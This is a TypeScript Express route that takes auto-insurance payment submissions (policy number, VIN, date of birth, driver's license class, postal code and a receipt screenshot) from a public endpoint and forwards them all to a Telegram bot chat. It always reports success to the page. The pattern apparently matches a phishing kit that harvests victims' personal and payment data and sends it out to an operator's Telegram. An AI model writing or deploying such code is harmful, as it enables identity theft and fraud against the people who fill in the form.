import { Router } from 'express';
import { z } from 'zod';
import { validate } from '../middleware/validate.js';

const router = Router();

const notifySchema = z.object({
  // Customer details
  policy_number:  z.string(),
  amount:         z.number(),
  coverage_type:  z.string(),
  term:           z.string(),
  deductible:     z.string(),
  // Vehicle
  vin:            z.string(),
  vehicle:        z.string(),
  // Driver
  license_class:  z.string(),
  dob:            z.string(),
  postal:         z.string(),
  // Screenshot as base64
  receipt_base64: z.string(),        // "data:image/png;base64,..."
  receipt_name:   z.string(),
});

// ─── POST /api/notify/payment  (public — called by the frontend) ──
router.post('/payment', validate(notifySchema), async (req, res, next) => {
  try {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId   = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      // Telegram not configured — acknowledge anyway so the UX doesn't break
      res.json({ ok: true, telegram: false });
      return;
    }

    const d = req.body as z.infer<typeof notifySchema>;

    // ── Build message caption ──────────────────────────────────
    const caption = [
      `📋 *New Payment Submission*`,
      ``,
      `*Policy:* \`${d.policy_number}\``,
      `*Amount:* $${d.amount} CAD`,
      `*Coverage:* ${d.coverage_type} — ${d.term}`,
      `*Deductible:* $${d.deductible}`,
      ``,
      `*Vehicle:* ${d.vehicle}`,
      `*VIN:* \`${d.vin}\``,
      ``,
      `*License:* ${d.license_class}`,
      `*DOB:* ${d.dob}`,
      `*Postal:* ${d.postal}`,
    ].join('\n');

    // ── Convert base64 to Buffer ───────────────────────────────
    const base64Data = d.receipt_base64.replace(/^data:[^;]+;base64,/, '');
    const imageBuffer = Buffer.from(base64Data, 'base64');

    const mimeType = d.receipt_base64.match(/^data:([^;]+);/)?.[1] || 'image/jpeg';
    const fileName = d.receipt_name || 'receipt.jpg';

    const sendViaMethod = async (method: 'sendPhoto' | 'sendDocument', fieldName: string) => {
      const form = new FormData();
      form.append('chat_id', chatId);
      form.append('caption', caption);
      form.append('parse_mode', 'Markdown');
      form.append(fieldName, new Blob([imageBuffer], { type: mimeType }), fileName);
      const res = await fetch(`https://api.telegram.org/bot${botToken}/${method}`, { method: 'POST', body: form });
      return res.json() as Promise<{ ok: boolean; description?: string }>;
    };

    // Try sendPhoto first; fall back to sendDocument for unsupported formats
    let tgBody = await sendViaMethod('sendPhoto', 'photo');
    if (!tgBody.ok) {
      console.error('[telegram] sendPhoto failed:', tgBody.description, '— retrying as document');
      tgBody = await sendViaMethod('sendDocument', 'document');
    }

    if (!tgBody.ok) {
      console.error('[telegram] sendDocument also failed:', tgBody.description);
    }

    res.json({ ok: true, telegram: tgBody.ok });
  } catch (err) {
    next(err);
  }
});

export default router;
